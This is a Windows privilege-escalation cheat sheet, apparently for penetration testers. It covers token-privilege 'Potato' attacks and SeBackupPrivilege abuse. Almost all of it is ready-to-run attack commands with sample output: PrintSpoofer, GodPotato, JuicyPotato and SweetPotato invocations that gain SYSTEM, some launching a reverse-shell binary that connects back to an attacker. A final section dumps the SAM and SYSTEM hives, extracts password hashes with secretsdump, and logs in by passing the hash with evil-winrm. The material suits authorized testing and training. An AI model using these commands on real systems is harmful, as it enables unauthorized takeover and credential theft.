# TOKEN PRIVILEGES (POTATO ATTACKS)

### Check for SeImpersonatePrivilege

```bash
whoami /priv
Look for: SeImpersonatePrivilege
```

> Service accounts often have this

**Why:** Gateway to SYSTEM

<details>
<summary>Example Output</summary>

```
whoami /priv
SeImpersonatePrivilege: Enabled

.\PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named Pipe: \\.\pipe\test\pipe
C:\> whoami
nt authority\system
```
</details>

---

### PrintSpoofer

```bash
.\PrintSpoofer64.exe -i -c cmd
```

> Windows 10 / Server 2016+

**Why:** Fast and reliable

<details>
<summary>Example Output</summary>

```
.\PrintSpoofer64.exe -i -c cmd
[+] Got SYSTEM shell
C:\Windows\system32> whoami
nt authority\system
(From service account to SYSTEM in seconds)
```
</details>

---

### GodPotato

```bash
.\GodPotato-NET4.exe -cmd 'cmd /c whoami'
```

> Works on most Windows versions

**Why:** Newer, more reliable

<details>
<summary>Example Output</summary>

```
.\GodPotato-NET4.exe -cmd 'cmd /c whoami'
[*] CombaseDisableUserDirectoryPatching
nt authority\system
```
</details>

---

### JuicyPotato

```bash
.\JuicyPotato.exe -l 1337 -p cmd.exe -a '/c C:\temp\rev.exe' -t *
```

> Windows Server 2016/2019

**Why:** Needs valid CLSID

<details>
<summary>Example Output</summary>

```
.\JuicyPotato.exe -l 1337 -p cmd.exe -a '/c C:\temp\rev.exe' -t *
[+] CreateProcessWithToken: OK

Attacker:
connect from 10.10.10.5
C:\> whoami
nt authority\system
```
</details>

---

### SweetPotato

```bash
.\SweetPotato.exe -e EfsRpc -p C:\temp\rev.exe
```

> Combines multiple potato techniques

**Why:** Try if others fail

<details>
<summary>Example Output</summary>

```
.\SweetPotato.exe -e EfsRpc -p C:\temp\rev.exe
[+] Exploiting EfsRpc
[+] Got SYSTEM token

Attacker shell:
C:\> whoami
nt authority\system
```
</details>

---

### Check for SeBackupPrivilege

```bash
whoami /priv
Look for: SeBackupPrivilege
```

> Can read any file on system

**Why:** Read SAM/SYSTEM hives, extract hashes

<details>
<summary>Example Output</summary>

```
whoami /priv
SeBackupPrivilege  Enabled

This means you can READ ANY FILE on the system
Exploit: dump SAM and SYSTEM registry hives

reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
(Then extract hashes with secretsdump)
```
</details>

---

### Backup privilege abuse

```bash
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
impacket-secretsdump -sam sam -system system LOCAL
```

> Dump registry hives

**Why:** Extract local admin hashes

<details>
<summary>Example Output</summary>

```
Transfer SAM + SYSTEM to attacker:
impacket-secretsdump -sam sam -system system LOCAL

Administrator:500:aad3b435b...:31d6cfe0d...
Guest:501:aad3b435b...:31d6cfe0d...

Now pass-the-hash:
evil-winrm -i 10.10.10.5 -u Administrator -H 31d6cfe0d...
(Full admin access from backup privilege)
```
</details>

---
